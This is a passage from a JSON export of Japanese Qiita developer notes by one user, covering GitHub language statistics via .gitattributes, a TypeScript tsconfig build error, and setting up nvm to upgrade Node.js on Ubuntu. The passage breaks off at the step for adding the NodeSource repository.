data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/08cac5e8-eb9f-4dc3-a7da-c833f71f5ae8.png\" loading=\"lazy\"></a></p>\n<h1 data-sourcepos=\"12:1-12:14\">\n<span id=\"解決方法\" class=\"fragment\"></span><a href=\"#%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95\"><i class=\"fa fa-link\"></i></a>解決方法</h1>\n<p data-sourcepos=\"13:1-13:70\"><code>.gitattributes</code>を使用して、CSSを言語統計から除外する</p>\n<ul data-sourcepos=\"15:1-16:0\">\n<li data-sourcepos=\"15:1-16:0\">プロジェクトのルート配下で.gitattributesファイルを作成する</li>\n</ul>\n<div class=\"code-frame\" data-lang=\"shell\" data-sourcepos=\"17:1-19:3\"><div class=\"highlight\"><pre><code><span class=\"nv\">$ </span><span class=\"nb\">touch</span> .gitattributes\n</code></pre></div></div>\n<ul data-sourcepos=\"21:1-21:67\">\n<li data-sourcepos=\"21:1-21:67\">CSSを言語統計から除外するよう.gitattributesに記載</li>\n</ul>\n<div class=\"code-frame\" data-lang=\"text\" data-sourcepos=\"22:1-24:3\">\n<div class=\"code-lang\"><span class=\"bold\">.gitattributes</span></div>\n<div class=\"highlight\"><pre><code>*.css linguist-documentation\n</code></pre></div>\n</div>\n<ul data-sourcepos=\"26:1-29:0\">\n<li data-sourcepos=\"26:1-27:0\">\n<p data-sourcepos=\"26:3-26:21\">commit、pushする</p>\n</li>\n<li data-sourcepos=\"28:1-29:0\">\n<p data-sourcepos=\"28:3-28:41\">変更が反映されたことを確認</p>\n</li>\n</ul>\n<p data-sourcepos=\"30:1-30:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F04c061cf-dff8-47c5-9c3d-040464e598d1.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=52b923536de6b55ac6e29a177131ded3\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F04c061cf-dff8-47c5-9c3d-040464e598d1.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=52b923536de6b55ac6e29a177131ded3\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F04c061cf-dff8-47c5-9c3d-040464e598d1.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=1a35daf1768d563ccfc37e44dc177a11 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/04c061cf-dff8-47c5-9c3d-040464e598d1.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"32:1-32:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F5e4ff1e7-28f8-4849-be5e-92861a7a02a0.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=e1a8757cc2a03303e3921d9442067d39\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F5e4ff1e7-28f8-4849-be5e-92861a7a02a0.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=e1a8757cc2a03303e3921d9442067d39\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F5e4ff1e7-28f8-4849-be5e-92861a7a02a0.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=11f8993d89d7e6d77869dd50b5b6d7e8 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/5e4ff1e7-28f8-4849-be5e-92861a7a02a0.png\" loading=\"lazy\"></a></p>\n<h1 data-sourcepos=\"35:1-35:14\">\n<span id=\"おわりに\" class=\"fragment\"></span><a href=\"#%E3%81%8A%E3%82%8F%E3%82%8A%E3%81%AB\"><i class=\"fa fa-link\"></i></a>おわりに</h1>\n<p data-sourcepos=\"36:1-37:66\"><a href=\"https://github.com/github-linguist/linguist/blob/main/docs/how-linguist-works.md\" rel=\"nofollow noopener\" target=\"_blank\">Linguist</a><br>\nを使用して統計を出していることを学びました。</p>\n<h1 data-sourcepos=\"39:1-39:8\">\n<span id=\"参考\" class=\"fragment\"></span><a href=\"#%E5%8F%82%E8%80%83\"><i class=\"fa fa-link\"></i></a>参考</h1>\n<p data-sourcepos=\"41:1-41:91\"><iframe id=\"qiita-embed-content__7914cc1c04f0e0ad0743fa66c0809d24\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__7914cc1c04f0e0ad0743fa66c0809d24\" data-content=\"https%3A%2F%2Fgithub.com%2Fgithub-linguist%2Flinguist%2Fblob%2Fmain%2Fdocs%2Foverrides.md%23using-gitattributes\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n","body":"# はじめに\nVite + React + TypeScriptプロジェクトを作成、GitHubに連携したところ、languageの割合のCSSが非常に高いため、修正を試みました。\n\n# 問題\nGitHubのプロジェクトが`CSS`プロジェクトとみなされている。Languagesの割合も高い。\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/20b2da00-e0a7-417e-925a-402e84831884.png)\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/08cac5e8-eb9f-4dc3-a7da-c833f71f5ae8.png)\n\n\n# 解決方法\n`.gitattributes`を使用して、CSSを言語統計から除外する\n\n* プロジェクトのルート配下で.gitattributesファイルを作成する\n\n```shell\n$ touch .gitattributes\n```\n\n* CSSを言語統計から除外するよう.gitattributesに記載\n```.gitattributes\n*.css linguist-documentation\n```\n\n* commit、pushする\n\n* 変更が反映されたことを確認\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/04c061cf-dff8-47c5-9c3d-040464e598d1.png)\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/5e4ff1e7-28f8-4849-be5e-92861a7a02a0.png)\n\n\n# おわりに\n[Linguist](https://github.com/github-linguist/linguist/blob/main/docs/how-linguist-works.md)\nを使用して統計を出していることを学びました。\n\n# 参考\n\nhttps://github.com/github-linguist/linguist/blob/main/docs/overrides.md#using-gitattributes\n","coediting":false,"comments_count":0,"created_at":"2025-04-05T13:42:53+09:00","group":null,"id":"1ca19968a2a0e4452dc2","likes_count":1,"private":false,"reactions_count":0,"stocks_count":1,"tags":[{"name":"GitHub","versions":[]},{"name":"language","versions":[]}],"title":"【GitHub】Languages割合を修正する","updated_at":"2025-04-05T13:43:23+09:00","url":"https://qiita.com/asa129/items/1ca19968a2a0e4452dc2","user":{"description":"0→1でWebアプリケーションを作れるようになるために奮闘中です。\r\nアイコンは@chinchilla.maruさん\r\nhttps://www.instagram.com/chinchilla.maru/","facebook_id":"","followees_count":45,"followers_count":53,"github_login_name":"asa129","id":"asa129","items_count":62,"linkedin_id":"","location":"","name":"","organization":"","permanent_id":3993509,"profile_image_url":"https://s3-ap-northeast-1.amazonaws.com/qiita-image-store/0/3993509/ea9105b8f7fedddb7175e913eeb5c288385a364a/large.png?1739071881","team_only":false,"twitter_screen_name":"jad1290","website_url":""},"page_views_count":488,"team_membership":null,"organization_url_name":"jisou","slide":false},{"rendered_body":"<h1 data-sourcepos=\"1:1-1:14\">\n<span id=\"はじめに\" class=\"fragment\"></span><a href=\"#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB\"><i class=\"fa fa-link\"></i></a>はじめに</h1>\n<p data-sourcepos=\"2:1-2:212\">react-testing-libraryの導入で<code>tsconfig.json</code>を変更したところ、表題のエラーとなりbuildできなくなりました。エラーの原因と解決方法を備忘録としてまとめました。</p>\n<h1 data-sourcepos=\"4:1-4:8\">\n<span id=\"問題\" class=\"fragment\"></span><a href=\"#%E5%95%8F%E9%A1%8C\"><i class=\"fa fa-link\"></i></a>問題</h1>\n<p data-sourcepos=\"5:1-5:65\"><code>tsconfig.json</code>を下記で設定すると、buildできない。</p>\n<div class=\"code-frame\" data-lang=\"json\" data-sourcepos=\"7:1-34:3\">\n<div class=\"code-lang\"><span class=\"bold\">tsconfig.json</span></div>\n<div class=\"highlight\"><pre><code><span class=\"p\">{</span><span class=\"w\">\n  </span><span class=\"nl\">\"files\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"p\">[],</span><span class=\"w\">\n  </span><span class=\"nl\">\"references\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"p\">[</span><span class=\"w\">\n    </span><span class=\"p\">{</span><span class=\"w\"> </span><span class=\"nl\">\"path\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">\"./tsconfig.app.json\"</span><span class=\"w\"> </span><span class=\"p\">},</span><span class=\"w\">\n    </span><span class=\"p\">{</span><span class=\"w\"> </span><span class=\"nl\">\"path\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">\"./tsconfig.node.json\"</span><span class=\"w\"> </span><span class=\"p\">}</span><span class=\"w\">\n  </span><span class=\"p\">],</span><span class=\"w\">\n  </span><span class=\"nl\">\"compilerOptions\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"p\">{</span><span class=\"w\">\n    </span><span class=\"nl\">\"target\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">\"ESNext\"</span><span class=\"p\">,</span><span class=\"w\">\n    </span><span class=\"nl\">\"useDefineForClassFields\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"kc\">true</span><span class=\"p\">,</span><span class=\"w\">\n    </span><span class=\"nl\">\"lib\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"p\">[</span><span class=\"s2\">\"DOM\"</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"s2\">\"DOM.Iterable\"</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"s2\">\"ESNext\"</span><span class=\"p\">],</span><span class=\"w\">\n    </span><span class=\"nl\">\"allowJs\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"kc\">false</span><span class=\"p\">,</span><span class=\"w\">\n    </span><span class=\"nl\">\"skipLibCheck\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"kc\">true</span><span class=\"p\">,</span><span class=\"w\">\n    </span><span class=\"nl\">\"esModuleInterop\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"kc\">false</span><span class=\"p\">,</span><span class=\"w\">\n    </span><span class=\"nl\">\"allowSyntheticDefaultImports\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"kc\">true</span><span class=\"p\">,</span><span class=\"w\">\n    </span><span class=\"nl\">\"strict\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"kc\">true</span><span class=\"p\">,</span><span class=\"w\">\n    </span><span class=\"nl\">\"forceConsistentCasingInFileNames\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"kc\">true</span><span class=\"p\">,</span><span class=\"w\">\n    </span><span class=\"nl\">\"module\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">\"ESNext\"</span><span class=\"p\">,</span><span class=\"w\">\n    </span><span class=\"nl\">\"moduleResolution\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">\"Node\"</span><span class=\"p\">,</span><span class=\"w\">\n    </span><span class=\"nl\">\"resolveJsonModule\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"kc\">true</span><span class=\"p\">,</span><span class=\"w\">\n    </span><span class=\"nl\">\"isolatedModules\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"kc\">true</span><span class=\"p\">,</span><span class=\"w\">\n    </span><span class=\"nl\">\"noEmit\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"kc\">true</span><span class=\"p\">,</span><span class=\"w\">\n    </span><span class=\"nl\">\"jsx\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">\"react-jsx\"</span><span class=\"p\">,</span><span class=\"w\">\n    </span><span class=\"nl\">\"types\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"p\">[</span><span class=\"s2\">\"node\"</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"s2\">\"jest\"</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"s2\">\"@testing-library/jest-dom\"</span><span class=\"p\">]</span><span class=\"w\">\n  </span><span class=\"p\">},</span><span class=\"w\">\n  </span><span class=\"nl\">\"include\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"p\">[</span><span class=\"s2\">\"src\"</span><span class=\"p\">]</span><span class=\"w\">\n</span><span class=\"p\">}</span><span class=\"w\">\n</span></code></pre></div>\n</div>\n<h1 data-sourcepos=\"36:1-36:14\">\n<span id=\"解決方法\" class=\"fragment\"></span><a href=\"#%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95\"><i class=\"fa fa-link\"></i></a>解決方法</h1>\n<p data-sourcepos=\"37:1-37:44\"><code>\"include\": [\"src\"]</code>の記述を削除する</p>\n<p data-sourcepos=\"39:1-39:69\">このエラーが発生した理由として考えられるのは：</p>\n<ul data-sourcepos=\"40:1-44:0\">\n<li data-sourcepos=\"40:1-42:0\">\n<p data-sourcepos=\"40:3-41:134\">include\": [\"src\"]を記述することで、コンパイル対象がsrc配下のみとなります<br>\nsrc配下以外も参照している場合、TypeScript はそれらを見つけられずエラーになったと考えられます。</p>\n</li>\n<li data-sourcepos=\"43:1-44:0\">\n<p data-sourcepos=\"43:3-43:45\">include設定が競合を起こしていた</p>\n</li>\n</ul>\n<div class=\"code-frame\" data-lang=\"diff_json\" data-sourcepos=\"45:1-73:3\">\n<div class=\"code-lang\"><span class=\"bold\">tsconfig.json</span></div>\n<div class=\"highlight\"><pre><code><span class=\"p\">{</span>\n<span class=\"w\">  </span><span class=\"nl\">\"files\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"p\">[],</span>\n<span class=\"w\">  </span><span class=\"nl\">\"references\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"p\">[</span>\n<span class=\"w\">    </span><span class=\"p\">{</span><span class=\"w\"> </span><span class=\"nl\">\"path\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">\"./tsconfig.app.json\"</span><span class=\"w\"> </span><span class=\"p\">},</span>\n<span class=\"w\">    </span><span class=\"p\">{</span><span class=\"w\"> </span><span class=\"nl\">\"path\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">\"./tsconfig.node.json\"</span><span class=\"w\"> </span><span class=\"p\">}</span>\n<span class=\"w\">  </span><span class=\"p\">],</span>\n<span class=\"w\">  </span><span class=\"nl\">\"compilerOptions\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"p\">{</span>\n<span class=\"w\">    </span><span class=\"nl\">\"target\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">\"ESNext\"</span><span class=\"p\">,</span>\n<span class=\"w\">    </span><span class=\"nl\">\"useDefineForClassFields\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"kc\">true</span><span class=\"p\">,</span>\n<span class=\"w\">    </span><span class=\"nl\">\"lib\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"p\">[</span><span class=\"s2\">\"DOM\"</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"s2\">\"DOM.Iterable\"</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"s2\">\"ESNext\"</span><span class=\"p\">],</span>\n<span class=\"w\">    </span><span class=\"nl\">\"allowJs\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"kc\">false</span><span class=\"p\">,</span>\n<span class=\"w\">    </span><span class=\"nl\">\"skipLibCheck\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"kc\">true</span><span class=\"p\">,</span>\n<span class=\"w\">    </span><span class=\"nl\">\"esModuleInterop\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"kc\">false</span><span class=\"p\">,</span>\n<span class=\"w\">    </span><span class=\"nl\">\"allowSyntheticDefaultImports\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"kc\">true</span><span class=\"p\">,</span>\n<span class=\"w\">    </span><span class=\"nl\">\"strict\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"kc\">true</span><span class=\"p\">,</span>\n<span class=\"w\">    </span><span class=\"nl\">\"forceConsistentCasingInFileNames\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"kc\">true</span><span class=\"p\">,</span>\n<span class=\"w\">    </span><span class=\"nl\">\"module\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">\"ESNext\"</span><span class=\"p\">,</span>\n<span class=\"w\">    </span><span class=\"nl\">\"moduleResolution\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">\"Node\"</span><span class=\"p\">,</span>\n<span class=\"w\">    </span><span class=\"nl\">\"resolveJsonModule\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"kc\">true</span><span class=\"p\">,</span>\n<span class=\"w\">    </span><span class=\"nl\">\"isolatedModules\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"kc\">true</span><span class=\"p\">,</span>\n<span class=\"w\">    </span><span class=\"nl\">\"noEmit\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"kc\">true</span><span class=\"p\">,</span>\n<span class=\"w\">    </span><span class=\"nl\">\"jsx\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">\"react-jsx\"</span><span class=\"p\">,</span>\n<span class=\"w\">    </span><span class=\"nl\">\"types\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"p\">[</span><span class=\"s2\">\"node\"</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"s2\">\"jest\"</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"s2\">\"@testing-library/jest-dom\"</span><span class=\"p\">]</span>\n<span class=\"hil\"><span class=\"err\">+</span><span class=\"w\">  </span><span class=\"p\">}</span>\n</span><span class=\"hdl\"><span class=\"err\">-</span><span class=\"w\">  </span><span class=\"p\">}</span><span class=\"err\">,</span>\n</span><span class=\"hdl\"><span class=\"o\">- </span><span class=\"w\"> </span><span class=\"nl\">\"include\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"p\">[</span><span class=\"s2\">\"src\"</span><span class=\"p\">]</span>\n</span><span class=\"p\">}</span>\n</code></pre></div>\n</div>\n<h1 data-sourcepos=\"75:1-75:14\">\n<span id=\"おわりに\" class=\"fragment\"></span><a href=\"#%E3%81%8A%E3%82%8F%E3%82%8A%E3%81%AB\"><i class=\"fa fa-link\"></i></a>おわりに</h1>\n<p data-sourcepos=\"76:1-76:30\">設定周り難しいです。</p>\n<h1 data-sourcepos=\"78:1-78:8\">\n<span id=\"参考\" class=\"fragment\"></span><a href=\"#%E5%8F%82%E8%80%83\"><i class=\"fa fa-link\"></i></a>参考</h1>\n<p data-sourcepos=\"79:1-79:124\"><iframe id=\"qiita-embed-content__081f92d54d3d68058c35539edc1096ce\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__081f92d54d3d68058c35539edc1096ce\" data-content=\"https%3A%2F%2Fstackoverflow.com%2Fquestions%2F78091866%2Ftypescript-build-error-ts6305-type-declaration-file-output-file-has-not-been-bu\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n","body":"# はじめに\nreact-testing-libraryの導入で`tsconfig.json`を変更したところ、表題のエラーとなりbuildできなくなりました。エラーの原因と解決方法を備忘録としてまとめました。\n\n# 問題\n`tsconfig.json`を下記で設定すると、buildできない。\n\n```json:tsconfig.json\n{\n  \"files\": [],\n  \"references\": [\n    { \"path\": \"./tsconfig.app.json\" },\n    { \"path\": \"./tsconfig.node.json\" }\n  ],\n  \"compilerOptions\": {\n    \"target\": \"ESNext\",\n    \"useDefineForClassFields\": true,\n    \"lib\": [\"DOM\", \"DOM.Iterable\", \"ESNext\"],\n    \"allowJs\": false,\n    \"skipLibCheck\": true,\n    \"esModuleInterop\": false,\n    \"allowSyntheticDefaultImports\": true,\n    \"strict\": true,\n    \"forceConsistentCasingInFileNames\": true,\n    \"module\": \"ESNext\",\n    \"moduleResolution\": \"Node\",\n    \"resolveJsonModule\": true,\n    \"isolatedModules\": true,\n    \"noEmit\": true,\n    \"jsx\": \"react-jsx\",\n    \"types\": [\"node\", \"jest\", \"@testing-library/jest-dom\"]\n  },\n  \"include\": [\"src\"]\n}\n```\n\n# 解決方法\n`\"include\": [\"src\"]`の記述を削除する\n\nこのエラーが発生した理由として考えられるのは：\n* include\": [\"src\"]を記述することで、コンパイル対象がsrc配下のみとなります\nsrc配下以外も参照している場合、TypeScript はそれらを見つけられずエラーになったと考えられます。\n\n* include設定が競合を起こしていた\n\n```diff_json:tsconfig.json\n{\n  \"files\": [],\n  \"references\": [\n    { \"path\": \"./tsconfig.app.json\" },\n    { \"path\": \"./tsconfig.node.json\" }\n  ],\n  \"compilerOptions\": {\n    \"target\": \"ESNext\",\n    \"useDefineForClassFields\": true,\n    \"lib\": [\"DOM\", \"DOM.Iterable\", \"ESNext\"],\n    \"allowJs\": false,\n    \"skipLibCheck\": true,\n    \"esModuleInterop\": false,\n    \"allowSyntheticDefaultImports\": true,\n    \"strict\": true,\n    \"forceConsistentCasingInFileNames\": true,\n    \"module\": \"ESNext\",\n    \"moduleResolution\": \"Node\",\n    \"resolveJsonModule\": true,\n    \"isolatedModules\": true,\n    \"noEmit\": true,\n    \"jsx\": \"react-jsx\",\n    \"types\": [\"node\", \"jest\", \"@testing-library/jest-dom\"]\n+  }\n-  },\n-  \"include\": [\"src\"]\n}\n```\n\n# おわりに\n設定周り難しいです。\n\n# 参考\nhttps://stackoverflow.com/questions/78091866/typescript-build-error-ts6305-type-declaration-file-output-file-has-not-been-bu\n","coediting":false,"comments_count":0,"created_at":"2025-04-04T22:09:49+09:00","group":null,"id":"edaeed1c939da8cb5647","likes_count":1,"private":false,"reactions_count":0,"stocks_count":1,"tags":[{"name":"TypeScript","versions":[]}],"title":"【TypeScript】error TS6305: Output file '/~/src/App.d.ts' has not been built from source file '/~/src/App.tsx'.","updated_at":"2025-04-04T22:09:49+09:00","url":"https://qiita.com/asa129/items/edaeed1c939da8cb5647","user":{"description":"0→1でWebアプリケーションを作れるようになるために奮闘中です。\r\nアイコンは@chinchilla.maruさん\r\nhttps://www.instagram.com/chinchilla.maru/","facebook_id":"","followees_count":45,"followers_count":53,"github_login_name":"asa129","id":"asa129","items_count":62,"linkedin_id":"","location":"","name":"","organization":"","permanent_id":3993509,"profile_image_url":"https://s3-ap-northeast-1.amazonaws.com/qiita-image-store/0/3993509/ea9105b8f7fedddb7175e913eeb5c288385a364a/large.png?1739071881","team_only":false,"twitter_screen_name":"jad1290","website_url":""},"page_views_count":725,"team_membership":null,"organization_url_name":"jisou","slide":false},{"rendered_body":"<h1 data-sourcepos=\"1:1-1:14\">\n<span id=\"はじめに\" class=\"fragment\"></span><a href=\"#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB\"><i class=\"fa fa-link\"></i></a>はじめに</h1>\n<p data-sourcepos=\"2:1-3:103\">Firebaseのインストールを試みたところ表題のエラーに遭遇しました。<br>\n今後も、versionの変更時にスムーズに対応できるよう備忘録として残します。</p>\n<h1 data-sourcepos=\"5:1-5:8\">\n<span id=\"問題\" class=\"fragment\"></span><a href=\"#%E5%95%8F%E9%A1%8C\"><i class=\"fa fa-link\"></i></a>問題</h1>\n<p data-sourcepos=\"6:1-6:68\">Node.jsのバージョンをv.20にアップグレードしたい。</p>\n<h1 data-sourcepos=\"8:1-8:8\">\n<span id=\"環境\" class=\"fragment\"></span><a href=\"#%E7%92%B0%E5%A2%83\"><i class=\"fa fa-link\"></i></a>環境</h1>\n<p data-sourcepos=\"9:1-9:18\">Ubuntu 22.04.5 LTS</p>\n<h1 data-sourcepos=\"11:1-11:14\">\n<span id=\"解決方法\" class=\"fragment\"></span><a href=\"#%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95\"><i class=\"fa fa-link\"></i></a>解決方法</h1>\n<p data-sourcepos=\"12:1-12:39\">以下の手順で解決しました。</p>\n<h3 data-sourcepos=\"14:1-14:49\">\n<span id=\"1nodejsの現在のバージョンを確認\" class=\"fragment\"></span><a href=\"#1nodejs%E3%81%AE%E7%8F%BE%E5%9C%A8%E3%81%AE%E3%83%90%E3%83%BC%E3%82%B8%E3%83%A7%E3%83%B3%E3%82%92%E7%A2%BA%E8%AA%8D\"><i class=\"fa fa-link\"></i></a>1.Node.jsの現在のバージョンを確認</h3>\n<div class=\"code-frame\" data-lang=\"shell\" data-sourcepos=\"15:1-17:3\"><div class=\"highlight\"><pre><code><span class=\"nv\">$ </span>node <span class=\"nt\">-v</span>\n</code></pre></div></div>\n<p data-sourcepos=\"19:1-19:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fc50e8195-5fa6-4f99-8f80-07ffd1298a51.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=68b70017a1f035bc9cc938203cd8d0be\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fc50e8195-5fa6-4f99-8f80-07ffd1298a51.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=68b70017a1f035bc9cc938203cd8d0be\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fc50e8195-5fa6-4f99-8f80-07ffd1298a51.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=7e40a23297e053b008d999f5e5159444 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/c50e8195-5fa6-4f99-8f80-07ffd1298a51.png\" loading=\"lazy\"></a></p>\n<h3 data-sourcepos=\"21:1-21:42\">\n<span id=\"2nvmコマンドのインストール\" class=\"fragment\"></span><a href=\"#2nvm%E3%82%B3%E3%83%9E%E3%83%B3%E3%83%89%E3%81%AE%E3%82%A4%E3%83%B3%E3%82%B9%E3%83%88%E3%83%BC%E3%83%AB\"><i class=\"fa fa-link\"></i></a>2.nvmコマンドのインストール</h3>\n<ul data-sourcepos=\"23:1-24:0\">\n<li data-sourcepos=\"23:1-24:0\">nvmコマンドがインストールされているか確認。コマンドがあればスキップ</li>\n</ul>\n<div class=\"code-frame\" data-lang=\"shell\" data-sourcepos=\"25:1-28:3\"><div class=\"highlight\"><pre><code><span class=\"nv\">$　</span>nvm <span class=\"nt\">--version</span>\n<span class=\"nv\">$ </span><span class=\"nb\">command</span> <span class=\"nt\">-v</span> nvm\n</code></pre></div></div>\n<ul data-sourcepos=\"30:1-32:0\">\n<li data-sourcepos=\"30:1-32:0\">結果が空の場合、使用しているシェルを確認<br>\n設定ファイルを開き、コードを追加する</li>\n</ul>\n<div class=\"code-frame\" data-lang=\"shell\" data-sourcepos=\"33:1-44:3\"><div class=\"highlight\"><pre><code><span class=\"nv\">$ </span><span class=\"nb\">echo</span> <span class=\"nv\">$SHELL</span>\n~/.bashrc\n<span class=\"c\"># 設定ファイルを開く</span>\n<span class=\"nv\">$ </span>nano ~/.bashrc\n<span class=\"c\"># 設定ファイルの下のほうに以下の行があるか確認、ない場合は追加</span>\n<span class=\"nb\">export </span><span class=\"nv\">NVM_DIR</span><span class=\"o\">=</span><span class=\"s2\">\"</span><span class=\"nv\">$HOME</span><span class=\"s2\">/.nvm\"</span>\n<span class=\"o\">[</span> <span class=\"nt\">-s</span> <span class=\"s2\">\"</span><span class=\"nv\">$NVM_DIR</span><span class=\"s2\">/nvm.sh\"</span> <span class=\"o\">]</span> <span class=\"o\">&amp;&amp;</span> <span class=\"se\">\\.</span> <span class=\"s2\">\"</span><span class=\"nv\">$NVM_DIR</span><span class=\"s2\">/nvm.sh\"</span> <span class=\"c\"># This loads nvm</span>\n<span class=\"o\">[</span> <span class=\"nt\">-s</span> <span class=\"s2\">\"</span><span class=\"nv\">$NVM_DIR</span><span class=\"s2\">/bash_completion\"</span> <span class=\"o\">]</span> <span class=\"o\">&amp;&amp;</span> <span class=\"se\">\\.</span> <span class=\"s2\">\"</span><span class=\"nv\">$NVM_DIR</span><span class=\"s2\">/bash_completion\"</span> <span class=\"c\"># This loads nvm bash_completion</span>\n<span class=\"c\"># 設定ファイル再読み込み</span>\n<span class=\"nv\">$ </span><span class=\"nb\">source</span> ~/.bashrc\n</code></pre></div></div>\n<h3 data-sourcepos=\"46:1-46:40\">\n<span id=\"3nodesourceリポジトリを追加\" class=\"fragment\"></span><a 